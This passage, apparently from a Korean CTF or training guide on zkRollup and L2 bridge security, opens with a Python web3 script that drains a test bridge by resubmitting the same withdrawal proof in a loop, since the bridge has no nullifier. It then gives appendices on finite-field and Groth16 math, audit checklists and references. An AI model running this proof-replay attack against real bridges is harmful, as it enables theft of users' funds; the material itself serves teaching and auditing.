**문제:** 취약한 브릿지에서 1000 ETH를 여러 번 출금해라.

```python
from web3 import Web3
import json

w3 = Web3(Web3.HTTPProvider("http://ctf-l1-node:8545"))

BRIDGE_ABI = json.load(open("bridge_abi.json"))
BRIDGE_ADDR = "0xVulnerableBridgeAddress"
bridge = w3.eth.contract(address=BRIDGE_ADDR, abi=BRIDGE_ABI)

def exploit_proof_replay():
    """
    nullifier 없는 취약한 브릿지 공격
    """
    # 1. 처음에 정상 출금
    original_proof = generate_withdrawal_proof(
        l2_tx_hash="0x...",
        amount=1000 * 10**18,
        recipient=attacker_address
    )

    # 2. 첫 번째 출금
    tx1 = bridge.functions.withdraw(
        original_proof['proof'],
        original_proof['amount'],
        original_proof['recipient']
    ).transact({'from': attacker})

    # 3. 동일 증명 재제출 (nullifier 없으면 성공!)
    tx2 = bridge.functions.withdraw(
        original_proof['proof'],  # 동일 증명!
        original_proof['amount'],
        original_proof['recipient']
    ).transact({'from': attacker})

    # 4. 반복
    for _ in range(10):
        bridge.functions.withdraw(
            original_proof['proof'],
            original_proof['amount'],
            original_proof['recipient']
        ).transact({'from': attacker})

    print(f"Attacker balance: {w3.eth.get_balance(attacker_address)}")
```

---

## 부록 A: ZK 수학 기초 참조

### 유한체(Finite Field) 기초

```
GF(p): 소수 p에 대한 유한체
  원소: {0, 1, ..., p-1}
  덧셈: a + b mod p
  곱셈: a * b mod p
  역원: a^(-1) = a^(p-2) mod p (페르마 소정리)

BN128 곡선 (Ethereum zkSNARKs):
  기저체: p = 21888242871839275222246405745257275088696311157297823662689037894645226208583
  스칼라체: r = 21888242871839275222246405745257275088548364400416034343698204186575808495617

BLS12-381 곡선 (Ethereum PoS):
  기저체: p = 0x1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab
```

### Groth16 증명 구조

```
Prove(pk, statement x, witness w):
  랜덤 r, s 선택
  [A]₁ = [α]₁ + ∑ aᵢ[uᵢ]₁ + r[δ]₁
  [B]₂ = [β]₂ + ∑ aᵢ[vᵢ]₂ + s[δ]₂
  [C]₁ = ∑ aᵢ[wᵢ]₁ + r[B]₁ + s[A]₁ - rs[δ]₁
  반환: (A, B, C)

Verify(vk, x, (A, B, C)):
  [L]₁ = [γ_abc_0]₁ + ∑ xᵢ[γ_abc_i]₁
  확인: e(A, B) = e([α]₁, [β]₂) · e(L, [γ]₂) · e(C, [δ]₂)
```

---

## 부록 B: L2 보안 체크리스트

```
zkRollup 감사 체크리스트:
  □ Fiat-Shamir 트랜스크립트에 모든 공개 입력 포함
  □ Circuit 식별자/버전 바인딩
  □ 모든 opcode 구현 검증 (특히 엣지 케이스)
  □ 범위 체크 완전성
  □ 브릿지 nullifier 구현
  □ Verifier 컨트랙트 pairing 체크 정확성
  □ Trusted setup 무결성
  □ 업그레이드 권한 검토

Optimistic Rollup 감사 체크리스트:
  □ Fault proof 모든 opcode 커버
  □ Bisection 프로토콜 완전성
  □ Force inclusion 경로 확인
  □ Challenge window 적절성 (7일 표준)
  □ Challenger 검열 저항성
  □ Sequencer 권한 범위

L2 DApp 개발 체크리스트:
  □ block.timestamp 신뢰성 확인
  □ Chainid 하드코딩 또는 런타임 확인
  □ Precompile 동작 차이 테스트
  □ EIP-6780 적용 여부 확인
  □ 크로스 체인 메시지 재사용 방지
```

---

## 참고 자료

- [OSecure ZkVM Vulnerability Analysis (2026.03)](https://osecure.io/reports/zkvm-2026)
- [Ethereum L2 Beat - Security Overview](https://l2beat.com/scaling/summary)
- [Vitalik's zkEVM Types](https://vitalik.eth.limo/general/2022/08/04/zkevm.html)
- [Groth16 Paper (Groth, 2016)](https://eprint.iacr.org/2016/260)
- [PLONK Paper (Gabizon et al., 2019)](https://eprint.iacr.org/2019/953)
- [Optimism Fault Proof Architecture](https://docs.optimism.io/stack/protocol/fault-proofs/overview)
- [EigenLayer Restaking Security](https://docs.eigenlayer.xyz/security/threat-model)
- [ZK Security Primer (Trail of Bits)](https://github.com/trailofbits/zksecurity-primer)
- [Sumcheck Protocol](https://people.cs.georgetown.edu/jthaler/ProofsArgsAndZK.html)
- [BLS12-381 for the Rest of Us](https://hackmd.io/@benjaminion/bls12-381)
